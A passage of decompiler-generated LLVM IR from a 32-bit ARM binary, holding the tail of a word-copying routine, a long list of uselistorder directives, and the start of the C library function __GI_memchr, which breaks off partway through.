  store i32 %v1_13c48, i32* %r1.global-to-local, align 4
  %v4_13c4c = udiv i32 %v3_13c48, 65536
  %v5_13c4c = or i32 %v4_13c4c, %v3_13c44
  store i32 %v5_13c4c, i32* @ip, align 4
  %v2_13c50 = add i32 %v1_13c50, -4
  %v3_13c50 = inttoptr i32 %v2_13c50 to i32*
  store i32 %v5_13c4c, i32* %v3_13c50, align 4
  %v4_13c50 = load i32, i32* %r0.global-to-local, align 4
  %v5_13c50 = add i32 %v4_13c50, -4
  store i32 %v5_13c50, i32* %r0.global-to-local, align 4
  %v0_13c54 = load i32, i32* %r2.global-to-local, align 4
  %v2_13c54 = add i32 %v0_13c54, -4
  store i32 %v2_13c54, i32* %r2.global-to-local, align 4
  %v6_13c58 = icmp slt i32 %v0_13c54, 4
  br i1 %v6_13c58, label %dec_label_pc_13c5c.loopexit, label %dec_label_pc_13c44

dec_label_pc_13c5c.loopexit:                      ; preds = %dec_label_pc_13c44
  %v4_13c54 = sub i32 3, %v0_13c54
  %v5_13c54 = and i32 %v4_13c54, %v0_13c54
  %v6_13c54 = icmp slt i32 %v5_13c54, 0
  %v7_13c54 = icmp slt i32 %v2_13c54, 0
  store i1 %v6_13c54, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_13c54, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13c5c

dec_label_pc_13c5c:                               ; preds = %dec_label_pc_13c5c.loopexit, %dec_label_pc_13c38
  %v2_13b3451 = phi i32 [ %v5_13c50, %dec_label_pc_13c5c.loopexit ], [ %v1_13c2c, %dec_label_pc_13c38 ]
  %v0_13b2447 = phi i32 [ %v2_13c54, %dec_label_pc_13c5c.loopexit ], [ %v2_13c3c, %dec_label_pc_13c38 ]
  %v0_13c5c = load i32, i32* %r1.global-to-local, align 4
  %v1_13c5c = add i32 %v0_13c5c, 2
  store i32 %v1_13c5c, i32* @r1, align 4
  br label %bb150

dec_label_pc_13c64:                               ; preds = %dec_label_pc_13b78
  br i1 %v5_13c68, label %dec_label_pc_13cb0, label %dec_label_pc_13c6c

dec_label_pc_13c6c:                               ; preds = %dec_label_pc_13c64
  store i32 %v2_13c64, i32* %r2.global-to-local, align 4
  %v3_13c70 = load i32, i32* @r4, align 4
  store i32 %v3_13c70, i32* %stack_var_-12, align 4
  %v6_13c70 = load i32, i32* @r5, align 4
  %v8_13c70 = inttoptr i32 %v6_13c70 to i8*
  store i8* %v8_13c70, i8** %stack_var_-8, align 4
  %v11_13c70 = load i32, i32* @lr, align 4
  br label %dec_label_pc_13c74

dec_label_pc_13c74:                               ; preds = %dec_label_pc_13c74.dec_label_pc_13c74_crit_edge, %dec_label_pc_13c6c
  %v0_13c98 = phi i32 [ %v1_13c98, %dec_label_pc_13c74.dec_label_pc_13c74_crit_edge ], [ %v0_13bc018, %dec_label_pc_13c6c ]
  %v0_13c78 = phi i32 [ %v0_13c78.pre, %dec_label_pc_13c74.dec_label_pc_13c74_crit_edge ], [ %v1_13b78, %dec_label_pc_13c6c ]
  %v0_13c74 = phi i32 [ %v0_13c74.pre, %dec_label_pc_13c74.dec_label_pc_13c74_crit_edge ], [ %v2_13b7c, %dec_label_pc_13c6c ]
  %v3_13c74 = mul i32 %v0_13c74, 16777216
  store i32 %v3_13c74, i32* %lr.global-to-local, align 4
  %v1_13c78 = add i32 %v0_13c78, -4
  %v2_13c78 = inttoptr i32 %v1_13c78 to i32*
  %v3_13c78 = load i32, i32* %v2_13c78, align 4
  store i32 %v3_13c78, i32* @r3, align 4
  %v4_13c78 = add i32 %v0_13c78, -8
  %v5_13c78 = inttoptr i32 %v4_13c78 to i32*
  %v6_13c78 = load i32, i32* %v5_13c78, align 4
  store i32 %v6_13c78, i32* %r4.global-to-local, align 4
  %v7_13c78 = add i32 %v0_13c78, -12
  %v8_13c78 = inttoptr i32 %v7_13c78 to i32*
  %v9_13c78 = load i32, i32* %v8_13c78, align 4
  store i32 %v9_13c78, i32* %r5.global-to-local, align 4
  %v10_13c78 = add i32 %v0_13c78, -16
  %v11_13c78 = inttoptr i32 %v10_13c78 to i32*
  %v12_13c78 = load i32, i32* %v11_13c78, align 4
  store i32 %v10_13c78, i32* %r1.global-to-local, align 4
  %v4_13c7c = udiv i32 %v12_13c78, 256
  %v5_13c7c = or i32 %v4_13c7c, %v3_13c74
  store i32 %v5_13c7c, i32* %lr.global-to-local, align 4
  %v3_13c80 = mul i32 %v12_13c78, 16777216
  %v4_13c84 = udiv i32 %v9_13c78, 256
  %v5_13c84 = or i32 %v3_13c80, %v4_13c84
  store i32 %v5_13c84, i32* @ip, align 4
  %v3_13c88 = mul i32 %v9_13c78, 16777216
  %v4_13c8c = udiv i32 %v6_13c78, 256
  %v5_13c8c = or i32 %v3_13c88, %v4_13c8c
  store i32 %v5_13c8c, i32* %r5.global-to-local, align 4
  %v3_13c90 = mul i32 %v6_13c78, 16777216
  %v4_13c94 = udiv i32 %v3_13c78, 256
  %v5_13c94 = or i32 %v3_13c90, %v4_13c94
  store i32 %v5_13c94, i32* %r4.global-to-local, align 4
  %v1_13c98 = add i32 %v0_13c98, -16
  %v2_13c98 = inttoptr i32 %v1_13c98 to i32*
  store i32 %v5_13c94, i32* %v2_13c98, align 4
  %v4_13c98 = add i32 %v0_13c98, -12
  %v5_13c98 = inttoptr i32 %v4_13c98 to i32*
  %v6_13c98 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_13c98, i32* %v5_13c98, align 4
  %v7_13c98 = add i32 %v0_13c98, -8
  %v8_13c98 = inttoptr i32 %v7_13c98 to i32*
  %v9_13c98 = load i32, i32* @ip, align 4
  store i32 %v9_13c98, i32* %v8_13c98, align 4
  %v10_13c98 = add i32 %v0_13c98, -4
  %v11_13c98 = inttoptr i32 %v10_13c98 to i32*
  %v12_13c98 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_13c98, i32* %v11_13c98, align 4
  store i32 %v1_13c98, i32* %r0.global-to-local, align 4
  %v0_13c9c = load i32, i32* %r2.global-to-local, align 4
  %v2_13c9c = add i32 %v0_13c9c, -16
  store i32 %v2_13c9c, i32* %r2.global-to-local, align 4
  %v6_13ca0 = icmp slt i32 %v0_13c9c, 16
  br i1 %v6_13ca0, label %dec_label_pc_13ca4, label %dec_label_pc_13c74.dec_label_pc_13c74_crit_edge

dec_label_pc_13c74.dec_label_pc_13c74_crit_edge:  ; preds = %dec_label_pc_13c74
  %v0_13c74.pre = load i32, i32* @r3, align 4
  %v0_13c78.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13c74

dec_label_pc_13ca4:                               ; preds = %dec_label_pc_13c74
  %v2_13ca4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13ca4, i32* @r4, align 4
  %v5_13ca4 = load i8*, i8** %stack_var_-8, align 4
  %v6_13ca4 = ptrtoint i8* %v5_13ca4 to i32
  store i32 %v6_13ca4, i32* @r5, align 4
  store i32 %v11_13c70, i32* @lr, align 4
  %v2_13ca8 = add i32 %v0_13c9c, -4
  store i32 %v2_13ca8, i32* %r2.global-to-local, align 4
  %v4_13ca8 = add i32 %v0_13c9c, 2147483632
  %v5_13ca8 = and i32 %v2_13ca8, %v4_13ca8
  %v6_13ca8 = icmp slt i32 %v5_13ca8, 0
  store i1 %v6_13ca8, i1* %cpsr_v.global-to-local, align 1
  %v7_13ca8 = icmp slt i32 %v2_13ca8, 0
  store i1 %v7_13ca8, i1* %cpsr_n.global-to-local, align 1
  %v8_13ca8 = icmp eq i32 %v2_13ca8, 0
  store i1 %v8_13ca8, i1* %cpsr_z.global-to-local, align 1
  %v5_13cac = icmp slt i32 %v2_13c9c, -12
  br i1 %v5_13cac, label %dec_label_pc_13cc8, label %dec_label_pc_13cb0

dec_label_pc_13cb0:                               ; preds = %dec_label_pc_13ca4, %dec_label_pc_13c64, %dec_label_pc_13cb0
  %v1_13cbc = phi i32 [ %v5_13cbc, %dec_label_pc_13cb0 ], [ %v1_13c98, %dec_label_pc_13ca4 ], [ %v0_13bc018, %dec_label_pc_13c64 ]
  %v0_13cb0 = load i32, i32* @r3, align 4
  %v3_13cb0 = mul i32 %v0_13cb0, 16777216
  store i32 %v3_13cb0, i32* %ip.global-to-local, align 4
  %v0_13cb4 = load i32, i32* %r1.global-to-local, align 4
  %v1_13cb4 = add i32 %v0_13cb4, -4
  %v2_13cb4 = inttoptr i32 %v1_13cb4 to i32*
  %v3_13cb4 = load i32, i32* %v2_13cb4, align 4
  store i32 %v3_13cb4, i32* @r3, align 4
  store i32 %v1_13cb4, i32* %r1.global-to-local, align 4
  %v4_13cb8 = udiv i32 %v3_13cb4, 256
  %v5_13cb8 = or i32 %v4_13cb8, %v3_13cb0
  store i32 %v5_13cb8, i32* @ip, align 4
  %v2_13cbc = add i32 %v1_13cbc, -4
  %v3_13cbc = inttoptr i32 %v2_13cbc to i32*
  store i32 %v5_13cb8, i32* %v3_13cbc, align 4
  %v4_13cbc = load i32, i32* %r0.global-to-local, align 4
  %v5_13cbc = add i32 %v4_13cbc, -4
  store i32 %v5_13cbc, i32* %r0.global-to-local, align 4
  %v0_13cc0 = load i32, i32* %r2.global-to-local, align 4
  %v2_13cc0 = add i32 %v0_13cc0, -4
  store i32 %v2_13cc0, i32* %r2.global-to-local, align 4
  %v6_13cc4 = icmp slt i32 %v0_13cc0, 4
  br i1 %v6_13cc4, label %dec_label_pc_13cc8.loopexit, label %dec_label_pc_13cb0

dec_label_pc_13cc8.loopexit:                      ; preds = %dec_label_pc_13cb0
  %v4_13cc0 = sub i32 3, %v0_13cc0
  %v5_13cc0 = and i32 %v4_13cc0, %v0_13cc0
  %v6_13cc0 = icmp slt i32 %v5_13cc0, 0
  %v7_13cc0 = icmp slt i32 %v2_13cc0, 0
  store i1 %v6_13cc0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_13cc0, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13cc8

dec_label_pc_13cc8:                               ; preds = %dec_label_pc_13cc8.loopexit, %dec_label_pc_13ca4
  %v2_13b3452 = phi i32 [ %v5_13cbc, %dec_label_pc_13cc8.loopexit ], [ %v1_13c98, %dec_label_pc_13ca4 ]
  %v0_13b2448 = phi i32 [ %v2_13cc0, %dec_label_pc_13cc8.loopexit ], [ %v2_13ca8, %dec_label_pc_13ca4 ]
  %v0_13cc8 = load i32, i32* %r1.global-to-local, align 4
  %v1_13cc8 = add i32 %v0_13cc8, 1
  store i32 %v1_13cc8, i32* @r1, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_13cbc, { 0, 2, 1 }
  uselistorder i32 %v3_13cb0, { 1, 0 }
  uselistorder i32 %v2_13ca8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_13c98, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_13c78, { 1, 0 }
  uselistorder i32 %v3_13c74, { 1, 0 }
  uselistorder i32 %v0_13c78, { 3, 2, 1, 0 }
  uselistorder i32 %v0_13c98, { 3, 2, 1, 0 }
  uselistorder i32 %v5_13c50, { 0, 2, 1 }
  uselistorder i32 %v3_13c44, { 1, 0 }
  uselistorder i32 %v2_13c3c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_13c2c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_13c0c, { 1, 0 }
  uselistorder i32 %v3_13c08, { 1, 0 }
  uselistorder i32 %v0_13c0c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_13c2c, { 3, 2, 1, 0 }
  uselistorder i32 %v5_13be4, { 0, 2, 1 }
  uselistorder i32 %v3_13bd8, { 1, 0 }
  uselistorder i32 %v2_13bd0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_13bc0, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_13ba0, { 1, 0 }
  uselistorder i32 %v3_13b9c, { 1, 0 }
  uselistorder i32 %v0_13ba0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_13bc0, { 3, 2, 1, 0 }
  uselistorder i1 %v5_13c68, { 2, 0, 1 }
  uselistorder i32 %v0_13b80, { 1, 0 }
  uselistorder i32 %v0_13c6c, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_13bc018, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_13b70, { 2, 1, 0 }
  uselistorder i32 %v0_13b70, { 2, 0, 1 }
  uselistorder i32 %v2_13b68, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_13b68, { 1, 2, 0, 3 }
  uselistorder i32 %v0_13b68, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_13bc019, { 2, 1, 0 }
  uselistorder i32 %v11_13b44, { 1, 0 }
  uselistorder i32 %v7_13b44, { 1, 0 }
  uselistorder i32 %v1_13b24, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_13b24, { 1, 2, 0, 3 }
  uselistorder i32 %v2_13b28, { 1, 0 }
  uselistorder i32 %v7_13b1c, { 0, 2, 1 }
  uselistorder i32 %v10_13b18, { 1, 0 }
  uselistorder i32 %v9_13b10, { 1, 0, 2 }
  uselistorder i32 %v6_13b0c, { 1, 0 }
  uselistorder i32 %v2_13b04, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_13b04, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_13b14, { 0, 3, 2, 1 }
  uselistorder i32 %v7_13af8, { 0, 2, 1 }
  uselistorder i32 %v13_13af4, { 1, 0 }
  uselistorder i32 %v4_13af0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_13af0, { 2, 0, 1 }
  uselistorder i32 %v6_13af8, { 0, 3, 2, 1 }
  uselistorder i32 %v7_13ae8, { 0, 2, 1 }
  uselistorder i32 %v16_13ae4, { 1, 0 }
  uselistorder i32 %v4_13ae0, { 1, 2, 0 }
  uselistorder i32 %v0_13af0.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_13ae8, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_13ad4, { 0, 3, 2, 1 }
  uselistorder i32 %v10_13ad0, { 1, 0 }
  uselistorder i32 %v1_13acc, { 1, 0 }
  uselistorder i32 %v10_13ac8, { 1, 0 }
  uselistorder i32 %v0_13ac8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_13acc, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_13ac0, { 0, 2, 1 }
  uselistorder i32 %v2_13ab4, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_13ab4, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_13acc36, { 1, 2, 0 }
  uselistorder i32 %v1_13aac, { 2, 1, 0 }
  uselistorder i32 %v1_13aa4, { 2, 3, 1, 0 }
  uselistorder i32 %v2_13a9c, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_13a98, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_13a94, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_13a94, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_13a84, { 0, 2, 1 }
  uselistorder i32 %v4_13a80, { 1, 0 }
  uselistorder i32 %v3_13a74, { 1, 0 }
  uselistorder i32 %v1_13a6c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_13a60, { 1, 0 }
  uselistorder i32 %v12_13a5c, { 0, 2, 1 }
  uselistorder i32 %v8_13a3c, { 1, 0, 2 }
  uselistorder i32 %v5_13a3c, { 1, 0, 2 }
  uselistorder i32 %v2_13a3c, { 1, 0, 2 }
  uselistorder i32 %v0_13a3c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_13a5c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_13a18, { 0, 2, 1 }
  uselistorder i32 %v4_13a14, { 1, 0 }
  uselistorder i32 %v3_13a08, { 1, 0 }
  uselistorder i32 %v1_13a00, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_139f4, { 1, 0 }
  uselistorder i32 %v12_139f0, { 0, 2, 1 }
  uselistorder i32 %v8_139d0, { 1, 0, 2 }
  uselistorder i32 %v5_139d0, { 1, 0, 2 }
  uselistorder i32 %v2_139d0, { 1, 0, 2 }
  uselistorder i32 %v0_139d0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_139f0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_139ac, { 0, 2, 1 }
  uselistorder i32 %v4_139a8, { 1, 0 }
  uselistorder i32 %v3_1399c, { 1, 0 }
  uselistorder i32 %v1_13994, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_13988, { 1, 0 }
  uselistorder i32 %v12_13984, { 0, 2, 1 }
  uselistorder i32 %v8_13964, { 1, 0, 2 }
  uselistorder i32 %v5_13964, { 1, 0, 2 }
  uselistorder i32 %v2_13964, { 1, 0, 2 }
  uselistorder i32 %v0_13964, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_13984, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_139c0, { 0, 2, 1 }
  uselistorder i32 %v1_139bc, { 2, 0, 1, 3 }
  uselistorder i32 %v4_13940, { 2, 0, 1, 3 }
  uselistorder i32 %v2_13940, { 2, 0, 1, 3 }
  uselistorder i32 %v0_139c4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_13a5c75, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_13934, { 1, 0 }
  uselistorder i32 %v0_13934, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1392c, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_1392c, { 1, 0, 2 }
  uselistorder i32 %v0_1392c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_13a5c76, { 1, 0 }
  uselistorder i32 %v1_1390c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_13914, { 1, 0 }
  uselistorder i32 %v0_138e8, { 3, 0, 1, 2 }
  uselistorder i32 %v1_138dc, { 1, 2, 0, 3 }
  uselistorder i32 %v5_138c8, { 1, 0, 2 }
  uselistorder i32 %v1_138c4, { 1, 0 }
  uselistorder i32 %v1_138bc, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_138bc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_138b4, { 0, 2, 1 }
  uselistorder i32 %v3_138b4, { 3, 0, 1, 2 }
  uselistorder i1 %v0_138b4, { 1, 0 }
  uselistorder i1 %v1_138b4, { 1, 0 }
  uselistorder i32 %v3_138b0, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_138a8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_13894, { 1, 2, 0 }
  uselistorder i32 %v1_1388c, { 0, 2, 1 }
  uselistorder i32 %v12_13888, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1387c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_13880, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_13870, { 0, 2, 1 }
  uselistorder i32 %v1_13868, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_13868, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_13860, { 1, 0 }
  uselistorder i32 %v1_13858, { 2, 1, 0 }
  uselistorder i32 %v2_13850, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_13850, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_1384c, { 1, 0 }
  uselistorder i32 %v2_13840, { 1, 0 }
  uselistorder i32 %v1_13840, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_13840, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 30, 1, 2, 3, 4, 5, 31, 6, 7, 8, 9, 10, 32, 11, 12, 13, 14, 15, 33, 16, 18, 17, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 34, 35, 67, 36, 37, 38, 39, 40, 68, 41, 42, 43, 44, 45, 69, 46, 47, 48, 49, 50, 70, 51, 52, 53, 55, 54, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 71 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 12, 1, 3, 6, 4, 13, 5, 7, 10, 8, 14, 9, 11, 15, 16, 17, 20, 18, 30, 19, 21, 24, 22, 31, 23, 25, 28, 26, 32, 27, 29, 33, 34, 37, 35, 38, 36, 39, 40, 41, 42 }
  uselistorder i32* %r0.global-to-local, { 2, 24, 3, 4, 25, 5, 6, 26, 7, 8, 9, 10, 11, 12, 27, 13, 15, 14, 16, 17, 28, 18, 19, 29, 20, 21, 22, 23, 30, 31, 39, 32, 33, 40, 34, 35, 41, 36, 37, 42, 38, 43, 44, 46, 45, 47, 48, 50, 49, 51, 52, 58, 59, 53, 54, 55, 60, 56, 57, 61, 62, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 26, 18, 19, 20, 27, 21, 22, 23, 28, 24, 25, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 24, 25, 2, 26, 0, 27, 1, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 2, 24, 0, 25, 1, 27, 26, 28, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 2, 27, 0, 28, 1, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1 }
  uselistorder i32 -5, { 1, 0, 2, 3 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13cb0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13c44, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13bd8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13b78, { 1, 0 }
  uselistorder label %.thread13, { 2, 0, 1 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_13b04, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_13ac8, { 1, 0 }
  uselistorder label %dec_label_pc_13ab4, { 1, 0 }
  uselistorder label %dec_label_pc_13a74, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13a08, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1399c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1393c, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %dec_label_pc_1390c, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread114, { 1, 0 }
  uselistorder label %dec_label_pc_138a8, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_13868, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_13cd4 = urem i32 %arg1, 256
  store i32 %v1_13cd4, i32* @r1, align 4
  %v0_13cf0.pr = load i32, i32* @r2, align 4
  %v2_13cf015 = icmp eq i32 %v0_13cf0.pr, 0
  %v0_13d04.pre = load i32, i32* @r0, align 4
  br i1 %v2_13cf015, label %dec_label_pc_13d00, label %dec_label_pc_13cf8

dec_label_pc_13cdc:                               ; preds = %dec_label_pc_13cf8
  %v1_13cdc = inttoptr i32 %v0_13cec to i8*
  %v2_13cdc = load i8, i8* %v1_13cdc, align 1
  %v3_13cdc = zext i8 %v2_13cdc to i32
  %v9_13ce0 = icmp eq i32 %v3_13cdc, %v1_13cd4
  br i1 %v9_13ce0, label %dec_label_pc_13db0, label %dec_label_pc_13ce8

dec_label_pc_13ce8:                               ; preds = %dec_label_pc_13cdc
  %v1_13ce8 = add i32 %v0_13ce8, -1
  %v1_13cec = add i32 %v0_13cec, 1
  %v2_13cf0 = icmp eq i32 %v1_13ce8, 0
  br i1 %v2_13cf0, label %dec_label_pc_13d00, label %dec_label_pc_13cf8

dec_label_pc_13cf8:                               ; preds = %entry, %dec_label_pc_13ce8
  %v0_13ce8 = phi i32 [ %v1_13ce8, %dec_label_pc_13ce8 ], [ %v0_13cf0.pr, %entry ]
  %v0_13cec = phi i32 [ %v1_13cec, %dec_label_pc_13ce8 ], [ %v0_13d04.pre, %entry ]
  %v1_13cf8 = urem i32 %v0_13cec, 4
  %v2_13cf8 = icmp eq i32 %v1_13cf8, 0
  br i1 %v2_13cf8, label %dec_label_pc_13d00, label %dec_label_pc_13cdc

dec_label_pc_13d00:                               ; preds = %dec_label_pc_13ce8, %dec_label_pc_13cf8, %entry
  %v0_13d7c22 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_13ce8 ], [ %v0_13ce8, %dec_label_pc_13cf8 ]
  %v0_13d04 = phi i32 [ %v0_13d04.pre, %entry ], [ %v1_13cec, %dec_label_pc_13ce8 ], [ %v0_13cec, %dec_label_pc_13cf8 ]
  %v4_13d00 = mul nuw nsw i32 %v1_13cd4, 256
  %v5_13d00 = or i32 %v4_13d00, %v1_13cd4
  %v4_13d08 = mul i32 %v5_13d00, 65536
  %v5_13d08 = or i32 %v4_13d08, %v5_13d00
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_13d7c22, 3
  br i1 %tmp, label %dec_label_pc_13d10, label %dec_label_pc_13da4.preheader

dec_label_pc_13d10:                               ; preds = %dec_label_pc_13d00, %dec_label_pc_13d7c.backedge
  %v0_13d2c60 = phi i32 [ %v1_13d2c, %dec_label_pc_13d7c.backedge ], [ %v0_13d7c22, %dec_label_pc_13d00 ]
  %v0_13d5059 = phi i32 [ %v4_13d10, %dec_label_pc_13d7c.backedge ], [ %v0_13d04, %dec_label_pc_13d00 ]
  %v1_13d10 = inttoptr i32 %v0_13d5059 to i32*
  %v2_13d10 = load i32, i32* %v1_13d10, align 4
  %v4_13d10 = add i32 %v0_13d5059, 4
  %v2_13d14 = xor i32 %v2_13d10, %v5_13d08
  %v2_13d18 = add i32 %v2_13d14, 2130640639
  %v1_13d1c = sub i32 -1, %v2_13d14
  %v2_13d20 = xor i32 %v2_13d18, %v1_13d1c
  %v2_13d24 = and i32 %v2_13d20, -2130640640
  %v2_13d28 = icmp eq i32 %v2_13d24, 0
  %v1_13d2c = add i32 %v0_13d2c60, -4
  br i1 %v2_13d28, label %dec_label_pc_13d7c.backedge, label %dec_label_pc_13d34

dec_label_pc_13d7c.backedge:                      ; preds = %dec_label_pc_13d10, %dec_label_pc_13d6c
  store i32 2130640639, i32* @ip, align 4
  %tmp73 = icmp ugt i32 %v1_13d2c, 3
  br i1 %tmp73, label %dec_label_pc_13d10, label %dec_label_pc_13da4.preheader

dec_label_pc_13d34:                               ; preds = %dec_label_pc_13d10
  %v2_13d34 = inttoptr i32 %v0_13d5059 to i8*
  %v3_13d34 = load i8, i8* %v2_13d34, align 1
  %v4_13d34 = zext i8 %v3_13d34 to i32
  %v9_13d3c = icmp eq i32 %v4_13d34, %v1_13cd4
  %v1_13d40 = add i32 %v0_13d5059, 3
  store i32 %v1_13d40, i32* @ip, align 4
  br i1 %v9_13d3c, label %dec_label_pc_13db0, label %dec_label_pc_13d48

dec_label_pc_13d48:                               ; preds = %dec_label_pc_13d34
  %v1_13d48 = add i32 %v0_13d5059, 1
  %v2_13d48 = inttoptr i32 %v1_13d48 to i8*
  %v3_13d48 = load i8, i8* %v2_13d48, align 1
  %v4_13d48 = zext i8 %v3_13d48 to i32
  %v9_13d4c = icmp eq i32 %v4_13d48, %v1_13cd4
  br i1 %v9_13d4c, label %bb, label %dec_label_pc_13d5c

bb:                                               ; preds = %dec_label_pc_13d48
  br label %dec_label_pc_13db0

dec_label_pc_13d5c:                               ; preds = %dec_label_pc_13d48
  %v1_13d5c = add i32 %v0_13d5059, 2
  %v2_13d5c = inttoptr i32 %v1_13d5c to i8*
  %v3_13d5c = load i8, i8* %v2_13d5c, align 1
  %v4_13d5c = zext i8 %v3_13d5c to i32
  %v9_13d60 = icmp eq i32 %v4_13d5c, %v1_13cd4
  br i1 %v9_13d60, label %dec_label_pc_13db0, label %dec_label_pc_13d6c

dec_label_pc_13d6c:                               ; preds = %dec_label_pc_13d5c
  %v2_13d6c = inttoptr i32 %v1_13d40 to i8*
  %v3_13d6c = load i8, i8* %v2_13d6c, align 1
  %v4_13d6c = zext i8 %v3_13d6c to i32
  %v9_13d70 = icmp eq i32 %v4_13d6c, %v1_13cd4
